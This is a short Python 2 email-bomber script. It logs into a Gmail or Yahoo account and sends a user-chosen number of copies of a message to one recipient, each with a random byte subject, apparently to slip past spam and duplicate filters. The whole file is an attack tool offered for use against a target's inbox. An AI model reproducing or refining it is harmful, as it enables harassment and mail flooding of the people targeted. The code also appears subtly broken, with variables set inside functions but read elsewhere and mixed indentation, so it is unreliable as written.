import os
import smtplib
import getpass
import time
import sys
try:
	def MailServer():
		server = raw_input ('MailServer Gmail/Yahoo: ')
		if server == 'gmail':
			smtp_server = 'smtp.gmail.com'
			port = 587
		elif server == 'yahoo':
			smtp_server = 'smtp.mail.yahoo.com'
			port = 25
		else:
			print '[!] Applies only to gmail and yahoo.'
			MailServer()

	def Getuser():
		user = raw_input('Email: ')
		if user == "":
			print 'Email is required'
			Getuser()
		Getpasswd()
	def Getpasswd():
		passwd = getpass.getpass('Password: ')
		if passwd == "":
			print 'Email is required'
			Getpasswd()
		Login()
	def Login():
		print '[i] Testing Account' 
		try:
			server = smtplib.SMTP(smtp_server,port) 
			server.ehlo()
			server.starttls()
			server.login(user,passwd)
		
			server.quit()
			print '[i] Test passed'
		except smtplib.SMTPAuthenticationError:
			print '\n[!] The username or password you entered is incorrect.'
			sys.exit()
		except KeyboardInterrupt:
			print '[-] Canceled'
			sys.exit()

	def email():
		try:
			server = smtplib.SMTP(smtp_server,port) 
			server.ehlo()
			if smtp_server == "smtp.gmail.com":
					server.starttls()
			server.login(user,passwd)
			for i in range(1, total+1):
				subject = os.urandom(9)
				msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
				server.sendmail(user,to,msg)
				print "\rE-mails sent: %i" % i
				sys.stdout.flush()
			server.quit()
			print '\n Done !!!'
		except KeyboardInterrupt:
			print '[-] Canceled'
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print '\n[!] The username or password you entered is incorrect.'
			sys.exit()
		except smtplib.SMTPServerDisconnected:
			print '\n[!] Server disconnected'
			print '[!] Reconnecting in 5 seconds'
			time.sleep(5)   # delays for 5 seconds. You can Also Use Float Value.
			print '[!] Attempting to reconnect'
		except smtplib.SMTPDataError:
			print '[!] smtplib.SMTPDataError:'
			print '[!] The SMTP server refused to accept the message data'
			print '[!] Or daily user sending quota exceeded'
		
	print '_________________________________________________________________________________________________________'
	print ' ╔═╗╔═╗╔══╗╔══╗╔═╗╔══╗  ╔═╗╔═╗╔═╗╔══╗╔══╗╔══╗╔═╗╔═╦╗╔══╗ '
        print ' ║╬║║╬║║╔╗║║╔╗║║║║╚╗╗║  ║╔╝║╬║║╦╝║╔╗║╚╗╔╝╚║║╝║║║║║║║║══╣ '
        print ' ║╔╝║╗╣║╠╣║║╔╗║║║║╔╩╝║  ║╚╗║╗╣║╩╗║╠╣║─║║─╔║║╗║║║║║║║╠══║ '
        print ' ╚╝─╚╩╝╚╝╚╝╚══╝╚═╝╚══╝  ╚═╝╚╩╝╚═╝╚╝╚╝─╚╝─╚══╝╚═╝╚╩═╝╚══╝ '
        print ' ─────────────────────  ────────────────────────────────  '
	print '_________________________________________________________________________________________________________'
	print ''
	MailServer()

	Getuser()

	print ''

	to = raw_input('\nTo: ')
	#subject = raw_input('Subject: ') 
	body = raw_input('Message: ')
	total = input('Number of send: ')
	email()
except KeyboardInterrupt:
			print '[-] Canceled'
			sys.exit()
